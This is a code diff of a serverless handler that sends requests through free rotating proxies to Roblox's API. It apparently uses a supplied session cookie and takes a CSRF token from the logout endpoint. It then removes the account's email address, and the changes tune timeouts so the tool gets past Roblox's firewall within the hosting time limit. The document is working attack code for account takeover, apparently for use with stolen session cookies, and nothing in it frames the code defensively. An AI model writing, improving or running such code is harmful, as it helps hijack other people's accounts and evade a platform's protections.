@@ -23,26 +23,28 @@ module.exports = async function handler(req, res) {
     };
 
     try {
+        // Fetch a fresh list of proxies
         const proxyRes = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all');
         const proxies = proxyRes.data.split('\n').map(p => p.trim()).filter(p => p.length > 0);
 
         if (proxies.length === 0) {
-             return res.status(500).json({ success: false, message: 'Could not fetch proxies.' });
+             return res.status(500).json({ success: false, message: 'Proxy API returned empty list.' });
         }
 
-        // Try max 4 proxies to stay under Vercel's 10-second limit
-        for (let i = 0; i < Math.min(proxies.length, 4); i++) {
+        // Only try 2 proxies to stay under Vercel's 10-second timeout
+        for (let i = 0; i < Math.min(proxies.length, 2); i++) {
             const agent = new HttpsProxyAgent(`http://${proxies[i]}`);
             
             try {
+                // 800ms timeout so it fails instantly if the proxy is dead
                 const authCheck = await axios.get('https://users.roblox.com/v1/users/authenticated', { 
-                    headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 1500 
+                    headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 800 
                 });
 
                 if (authCheck.status === 200) {
                     let csrfToken = '';
                     try {
-                        await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 1500 });
+                        await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 800 });
                     } catch (err) {
                         if (err.response && err.response.headers['x-csrf-token']) {
                             csrfToken = err.response.headers['x-csrf-token'];
@@ -54,24 +56,25 @@ module.exports = async function handler(req, res) {
                     try {
                         await axios.post('https://accountsettings.roblox.com/v1/email', { emailAddress: "" }, { 
                             headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrfToken }, 
-                            httpsAgent: agent, proxy: false, timeout: 1500 
+                            httpsAgent: agent, proxy: false, timeout: 800 
                         });
                         
                         return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
                     } catch (err) {
                         if (err.response && err.response.status === 403) {
-                            return res.status(200).json({ success: false, data: { messages: ["Blocked: Roblox requires password for this endpoint."] } });
+                            return res.status(403).json({ success: false, message: "Roblox requires a password to remove the email." });
                         }
                     }
                 }
             } catch (err) {
-                continue; 
+                continue; // Try next proxy immediately
             }
         }
 
-        res.status(500).json({ success: false, message: 'All proxies failed or timed out.' });
+        // If we get here, both proxies failed or timed out
+        res.status(500).json({ success: false, message: 'Proxies blocked by Roblox firewall. Try again.' });
 
     } catch (error) {
-        res.status(500).json({ success: false, message: 'Internal Error', error: error.message });
+        res.status(500).json({ success: false, message: 'Network Error: ' + error.message });
     }
 }
